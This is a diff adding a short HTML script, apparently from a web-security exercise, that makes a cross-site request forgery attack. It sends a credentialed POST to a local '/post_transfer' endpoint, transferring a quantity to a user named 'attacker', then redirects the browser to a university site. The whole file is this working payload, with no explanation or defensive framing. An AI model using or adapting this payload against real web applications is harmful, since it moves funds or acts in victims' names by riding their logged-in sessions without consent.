@@ -1,0 +1,11 @@
+<script>
+    var params = "destination_username=attacker&quantity=10";
+    var req= new XMLHttpRequest();
+    req.withCredentials=true;
+    req.onload=function(){
+        window.location = "https://www.kw.ac.kr";
+    }
+    req.open("post", "http://localhost:3000/post_transfer");
+    req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    req.send(params);
+    </script>
